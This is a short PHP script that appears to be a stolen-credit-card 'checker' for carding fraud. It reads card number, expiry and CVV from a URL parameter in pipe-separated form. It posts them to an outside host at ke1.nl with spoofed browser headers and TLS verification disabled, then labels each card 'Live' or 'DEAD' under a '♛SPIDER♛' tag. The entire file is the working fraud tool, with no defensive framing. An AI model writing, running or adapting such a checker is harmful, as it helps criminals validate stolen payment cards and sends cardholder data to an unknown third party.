<?php

#include("bin.php");

function check($card){
$url = "http://kea3.ke1.nl/ccn1/alien07.php";
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);;
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$headers = array();
$headers["Accept"] = "application/json, text/javascript, */*; q=0.01";
$headers["X-Requested-With"] = "XMLHttpRequest";
$headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36";
$headers["Content-Type"] = "application/x-www-form-urlencoded";
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
$data = "ajax=1&cclist=".$card."&do=check";
curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($curl);
curl_close($curl);
return $resp;
}


$cc=$_GET['cc'];
$lista = $cc;
$cca = explode("|", $lista)[0];
$mes = explode("|", $lista)[1];
$ano = explode("|", $lista)[2];
$cvv = explode("|", $lista)[3];

$mystring = $cc;
$findme   = '|';
$pos = strpos($mystring, $findme);
if($pos === false){
	print "!!!";
}else{
	$rx=explode("|",$cc);
	if(!$rx[3] | $rx[3]==null){
		print "!error";
	}else{
		if(preg_match('/[a-z]/is',$cc)){
			print "error invaild!";
		}else{
	$look=check($cc);
	$find   = 'Live';
	$pos3 = strpos($look, $find);
	if($pos3 === false){
		echo '<span class="badge badge-danger">Rejected</span> '.$cc.' <b> DEAD ♛SPIDER♛ </b>';	
	}else{
		echo '<span class="badge badge-success">#Aprovada</span> ' . $cc . ' <b style="color: green;"> Live ♛SPIDER♛ <br>';
	}
	}
	}
}
